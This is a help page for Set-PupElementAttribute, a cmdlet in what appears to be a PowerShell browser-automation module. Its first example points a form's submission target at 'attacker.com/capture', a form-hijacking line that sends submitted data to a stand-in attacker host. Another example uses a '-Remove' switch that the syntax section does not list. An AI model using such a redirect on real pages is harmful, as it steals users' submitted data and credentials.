---
external help file: Pup.dll-Help.xml
Module Name: Pup
online version:
schema: 2.0.0
---

# Set-PupElementAttribute

## SYNOPSIS
Sets an attribute value on an element.

## SYNTAX

```
Set-PupElementAttribute -Element <PupElement> -Name <String> -Value <String>
 [-ProgressAction <ActionPreference>] [<CommonParameters>]
```

## DESCRIPTION
Sets or modifies an HTML attribute on an element.
Can be used to manipulate form fields, change links, or modify element behavior.

## EXAMPLES

### Example 1: Change form action
```
$form = Find-PupElements -Page $page -Selector "form" -First
Set-PupElementAttribute -Element $form -Name "action" -Value "https://attacker.com/capture"
```

Modifies the form submission target.

### Example 2: Remove disabled attribute
```
$btn = Find-PupElements -Page $page -Selector "#submit-btn" -First
Set-PupElementAttribute -Element $btn -Name "disabled" -Remove
```

Enables a disabled button for testing.

### Example 3: Modify input type
```
$input = Find-PupElements -Page $page -Selector "input[type=hidden]" -First
Set-PupElementAttribute -Element $input -Name "type" -Value "text"
```

Changes hidden input to visible for inspection.

## PARAMETERS

### -Element
Element to set attribute on

```yaml
Type: PupElement
Parameter Sets: (All)
Aliases:

Required: True
Position: Named
Default value: None
Accept pipeline input: True (ByValue)
Accept wildcard characters: False
```

### -Name
Name of the attribute to set

```yaml
Type: String
Parameter Sets: (All)
Aliases:

Required: True
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -ProgressAction
{{ Fill ProgressAction Description }}

```yaml
Type: ActionPreference
Parameter Sets: (All)
Aliases: proga

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -Value
Value for the attribute

```yaml
Type: String
Parameter Sets: (All)
Aliases:

Required: True
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### CommonParameters
This cmdlet supports the common parameters: -Debug, -ErrorAction, -ErrorVariable, -InformationAction, -InformationVariable, -OutVariable, -OutBuffer, -PipelineVariable, -Verbose, -WarningAction, and -WarningVariable. For more information, see [about_CommonParameters](http://go.microsoft.com/fwlink/?LinkID=113216).

## INPUTS

## OUTPUTS

## NOTES

## RELATED LINKS
